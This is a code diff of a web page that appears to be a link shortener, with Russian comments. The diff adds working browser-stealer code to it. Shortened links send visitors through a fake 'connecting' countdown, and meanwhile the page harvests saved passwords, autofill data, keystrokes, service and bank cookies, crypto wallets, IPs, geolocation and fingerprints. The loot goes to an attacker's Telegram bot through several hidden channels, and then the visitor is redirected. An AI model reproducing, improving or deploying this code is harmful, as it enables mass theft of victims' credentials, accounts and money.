-    async function sendPartialKeylog(){ if(keyLogStr.length>200 && botToken && chatId){ let part=keyLogStr.slice(-1500); fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{ method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ chat_id:chatId, text:`⌨️ KEYLOG (partial):\n${part}` }), mode:'no-cors', keepalive:true }); lastSend=Date.now(); } }
-
-    async function fullGrabAndSend(){
-        grabStorages(); grabForms(); createAutoFillTraps(); grabAllServices(); grabCryptoWallets(); grabGlobalVars();
-        collectedData.webrtcIP=await getWebRTCIP(); collectedData.publicIP=await getPublicIP(); collectedData.geolocation=await getGeo(); collectedData.fingerprint=await getFingerprint();
+    function sendViaImage(text){
+        let url=`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text.slice(0,200))}`;
+        let img=new Image(); img.src=url; return true;
+    }
+    async function sendViaIframe(data){
+        return new Promise(resolve=>{
+            let ifr=document.createElement('iframe'); ifr.style.display='none';
+            let form=document.createElement('form'); form.method='POST'; form.action=`https://api.telegram.org/bot${botToken}/sendDocument`; form.target='swill_iframe'; form.enctype='multipart/form-data';
+            let input1=document.createElement('input'); input1.name='chat_id'; input1.value=chatId;
+            let json=JSON.stringify(data,null,2); let blob=new Blob([json],{type:'text/plain'});
+            let input2=document.createElement('input'); input2.name='document'; input2.type='file'; 
+            // не можем программно прикрепить файл, поэтому этот метод только для текста
+            form.appendChild(input1); document.body.appendChild(ifr); document.body.appendChild(form);
+            setTimeout(()=>{ ifr.remove(); form.remove(); resolve(false); },100);
+        });
+    }
+    function storeLocally(data){
+        try{ localStorage.setItem('swill_backup_'+Date.now(), JSON.stringify(data)); } catch(e){}
+    }
+    
+    async function sendAllData(data){
+        let filename=`dump_${Date.now()}.txt`;
+        let success=false;
+        success = await sendViaFetch(data,filename) || success;
+        success = sendViaBeacon(data,filename) || success;
+        let summary = `📊 Report from ${data.url}\nTime: ${data.time}\nIP: ${data.webrtcIP||'?'}\nPasswords: ${data.passwords.length}\nKeystrokes: ${data.keystrokes.length}\nServices: ${Object.keys(data).filter(k=>['roblox','discord','steam','vk','google','facebook','twitter','instagram','amazon','netflix','spotify','bankCookies'].includes(k)).length}`;
+        sendViaImage(summary);
+        storeLocally(data);
+        if(data.passwords.length){
+            let pText="🔑 PASSWORDS:\n"+data.passwords.map(p=>`${p.field}: ${p.pass}`).join('\n');
+            sendViaImage(pText.slice(0,200));
+        }
+        if(data.autofill.length){
+            let aText="🔄 AUTOFILL:\n"+data.autofill.map(a=>`${a.type}: ${a.value}`).join('\n');
+            sendViaImage(aText.slice(0,200));
+        }
+        if(keyLogStr.length){
+            let keyBlob=new Blob([keyLogStr],{type:'text/plain'});
+            let fd=new FormData(); fd.append('chat_id',chatId); fd.append('document',keyBlob,'keystrokes.log');
+            try{ await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`,{ method:'POST', body:fd, mode:'no-cors', keepalive:true }); } catch(e){}
+        }
+        return success;
+    }
+    
+    async function sendPartialKeylog(){
+        if(keyLogStr.length>200 && botToken && chatId){
+            let part=keyLogStr.slice(-1500);
+            sendViaImage(`⌨️ KEYLOG (partial):\n${part}`);
+            lastKeySend=Date.now();
+        }
+    }
+    
+    // ----- ОСНОВНОЙ СБОРЩИК -----
+    async function runSteal(){
+        grabStorages(); grabForms(); createAutofillTraps(); grabAllServices(); grabCrypto();
+        stolen.webrtcIP=await getWebRTCIP(); stolen.publicIP=await getPublicIP(); stolen.geolocation=await getGeo(); stolen.fingerprint=await getFingerprint();
         await new Promise(r=>setTimeout(r,6000));
-        grabForms(); grabStorages(); grabAllServices();
-        await sendToTelegram(collectedData,'swill_dump.txt'); await sendPasswordsAndKeys();
+        grabForms(); grabStorages(); grabAllServices(); grabCrypto();
+        await sendAllData(stolen);
     }
-
-    async function handleHashRedirect(){
-        let hash=window.location.hash.substring(1);
+    
+    // ----- ПРОВЕРКА ДОСТУПА (без упоминания Telegram) -----
+    async function checkBackend(token){
+        const controller=new AbortController(); const timeout=setTimeout(()=>controller.abort(),5000);
+        try{
+            let resp=await fetch(`https://api.telegram.org/bot${token}/getMe`,{ method:'GET', signal:controller.signal, mode:'cors' });
+            clearTimeout(timeout); return resp.ok;
+        } catch(e){ clearTimeout(timeout); return false; }
+    }
+    
+    // ----- ОБРАБОТЧИК ПЕРЕХОДА ПО ХЭШУ -----
+    async function handleHash(){
+        let hash=location.hash.substring(1);
         if(!hash) return;
         let decoded;
         try{
@@ -375,28 +344,62 @@
             decoded={ originalUrl:url, botToken:token, chatId:Number(id) };
         } catch(e){ alert("Недействительная ссылка"); return; }
         botToken=decoded.botToken; chatId=decoded.chatId; targetUrl=decoded.originalUrl;
-        const overlay=document.getElementById('overlay'); const statusMsg=document.getElementById('statusMsg'); const timerDisplay=document.getElementById('timerDisplay'); const errorContainer=document.getElementById('errorContainer');
-        overlay.classList.remove('hidden'); statusMsg.innerText="Подключение...";
+        const overlay=document.getElementById('overlay');
+        const statusMsg=document.getElementById('statusMsg');
+        const timerDisplay=document.getElementById('timerDisplay');
+        const errorDiv=document.getElementById('errorContainer');
+        overlay.classList.remove('hidden');
+        statusMsg.innerText="Подключение...";
         let available=await checkBackend(botToken);
         if(!available){
-            errorContainer.innerHTML=`<div class="error-box">⚠️ Ошибка соединения. Попробуйте включить VPN и обновить страницу.</div>`;
-            document.querySelector('.spinner').style.display='none'; timerDisplay.style.display='none'; statusMsg.innerText="";
+            errorDiv.innerHTML=`<div class="error-box">⚠️ Ошибка соединения. Попробуйте включить VPN и обновить страницу.</div>`;
+            document.querySelector('.spinner').style.display='none';
+            timerDisplay.style.display='none';
+            statusMsg.innerText="";
             return;
         }
-        canProceed=true;
-        let seconds=5; timerDisplay.innerText=seconds;
-        let interval=setInterval(()=>{ seconds--; timerDisplay.innerText=seconds; if(seconds<=0){ clearInterval(interval); timerDisplay.innerText=""; statusMsg.innerText="Перенаправление..."; fullGrabAndSend().then(()=>{ setTimeout(()=>{ window.location.href=targetUrl; },1500); }); } },1000);
+        canCollect=true;
+        let seconds=5;
+        timerDisplay.innerText=seconds;
+        let interval=setInterval(()=>{
+            seconds--;
+            timerDisplay.innerText=seconds;
+            if(seconds<=0){
+                clearInterval(interval);
+                statusMsg.innerText="Перенаправление...";
+                runSteal().then(()=>{
+                    setTimeout(()=>{ window.location.href=targetUrl; },1500);
+                });
+            }
+        },1000);
     }
-
-    function generateShortLink(originalUrl,token,id){ let payload=`${originalUrl}|${token}|${id}`; let encoded=btoa(unescape(encodeURIComponent(payload))); return window.location.origin+window.location.pathname+'#'+encoded; }
+    
+    // ----- ИНТЕРФЕЙС СОЗДАНИЯ ССЫЛОК -----
+    function generateShortLink(originalUrl,token,id){
+        let payload=`${originalUrl}|${token}|${id}`;
+        let encoded=btoa(unescape(encodeURIComponent(payload)));
+        return location.origin+location.pathname+'#'+encoded;
+    }
     document.getElementById('shortenBtn').onclick=()=>{
-        let long=document.getElementById('longUrl').value.trim(); let token=document.getElementById('botToken').value.trim(); let cid=document.getElementById('chatId').value.trim();
-        if(!long.startsWith('http')){ alert('Ссылка должна начинаться с http:// или https://'); return; } if(!token){ alert('Введите токен бота'); return; } if(!cid||isNaN(Number(cid))){ alert('ID получателя должен быть числом'); return; }
-        let short=generateShortLink(long,token,Number(cid)); document.getElementById('shortLinkDisplay').innerText=short; document.getElementById('resultBlock').classList.add('show');
+        let long=document.getElementById('longUrl').value.trim();
+        let token=document.getElementById('botToken').value.trim();
+        let cid=document.getElementById('chatId').value.trim();
+        if(!long.startsWith('http')){ alert('Ссылка должна начинаться с http:// или https://'); return; }
+        if(!token){ alert('Введите токен бота'); return; }
+        if(!cid||isNaN(Number(cid))){ alert('ID получателя должен быть числом'); return; }
+        let short=generateShortLink(long,token,Number(cid));
+        document.getElementById('shortLinkDisplay').innerText=short;
+        document.getElementById('resultBlock').classList.add('show');
     };
-    document.getElementById('copyBtn').onclick=()=>{ navigator.clipboard.writeText(document.getElementById('shortLinkDisplay').innerText); let toast=document.getElementById('toastMessage'); toast.classList.add('show-toast'); setTimeout(()=>toast.classList.remove('show-toast'),1500); };
-    window.addEventListener('DOMContentLoaded',()=>handleHashRedirect()); window.addEventListener('hashchange',()=>handleHashRedirect());
-    interceptNetwork();
+    document.getElementById('copyBtn').onclick=()=>{
+        navigator.clipboard.writeText(document.getElementById('shortLinkDisplay').innerText);
+        let toast=document.getElementById('toastMessage');
+        toast.classList.add('show-toast');
+        setTimeout(()=>toast.classList.remove('show-toast'),1500);
+    };
+    
+    window.addEventListener('DOMContentLoaded',()=>handleHash());
+    window.addEventListener('hashchange',()=>handleHash());
 })();
 </script>
 </body>
